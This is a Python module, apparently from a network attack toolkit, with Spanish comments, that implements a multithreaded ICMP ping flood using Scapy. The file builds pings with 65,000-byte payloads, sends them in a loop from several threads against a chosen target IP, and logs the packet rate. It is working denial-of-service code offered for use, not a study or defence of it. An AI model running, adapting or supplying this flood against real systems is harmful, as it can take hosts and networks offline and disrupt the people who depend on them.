from dataclasses import dataclass
from ..utils.logging_utils import setup_logger
from ..utils.network_utils import validate_ip
import threading
import time
from scapy.layers.inet import IP, ICMP
from scapy.all import send


@dataclass
class PingFloodConfig:
    target_ip: str
    payload_size: int = 65000
    thread_count: int = 1
    packet_count: int = None
    interval: float = 0.001


class PingFloodAttack:
    def __init__(self, config: PingFloodConfig):
        self.config = config
        self.logger = setup_logger("ping_flood")
        self.running = False
        self.packets_sent = 0
        self.start_time = None

    def craft_packet(self):
        """Crea un paquete ICMP."""
        return IP(dst=self.config.target_ip)/ICMP()/("X" * self.config.payload_size)

    def attack_thread(self):
        """Función ejecutada por cada thread del ataque."""
        packet = self.craft_packet()

        while self.running:
            if self.config.packet_count and self.packets_sent >= self.config.packet_count:
                break

            send(packet, verbose=0)
            self.packets_sent += 1

            if self.packets_sent % 100 == 0:
                self.log_statistics()

            time.sleep(self.config.interval)

    def log_statistics(self):
        """Registra estadísticas del ataque."""
        if self.start_time:
            elapsed_time = time.time() - self.start_time
            packets_per_second = self.packets_sent / elapsed_time
            self.logger.info(f"Paquetes enviados: {self.packets_sent}, "
                             f"Velocidad: {packets_per_second:.2f} paquetes/segundo")

    def start_attack(self):
        """Inicia el ataque Ping Flood."""
        if not validate_ip(self.config.target_ip):
            self.logger.error(f"IP objetivo inválida: {self.config.target_ip}")
            return

        self.running = True
        self.start_time = time.time()
        self.logger.info(
            f"Iniciando Ping Flood contra {self.config.target_ip}")

        threads = []
        for _ in range(self.config.thread_count):
            thread = threading.Thread(target=self.attack_thread)
            thread.start()
            threads.append(thread)

        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        """Detiene el ataque."""
        self.running = False
        self.logger.info(
            f"Ataque detenido. Total de paquetes enviados: {self.packets_sent}")
